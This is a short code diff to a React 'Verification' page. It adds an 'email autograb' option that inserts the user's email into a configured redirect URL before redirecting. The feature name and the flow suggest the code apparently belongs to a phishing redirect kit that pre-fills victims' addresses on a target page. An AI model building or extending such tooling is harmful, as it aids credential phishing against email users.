@@ -35,7 +35,16 @@ export default function Verification() {
           : 1000;
         
         setTimeout(() => {
-          window.location.href = data.settings.redirectUrl;
+          let redirectUrl = data.settings.redirectUrl;
+          
+          // Handle email autograb feature
+          if (data.settings.useEmailAutograb && data.email) {
+            const paramName = data.settings.emailAutograbParam || 'email';
+            const placeholder = `{${paramName}}`;
+            redirectUrl = redirectUrl.replace(placeholder, encodeURIComponent(data.email));
+          }
+          
+          window.location.href = redirectUrl;
         }, redirectTimeout);
       }
     }
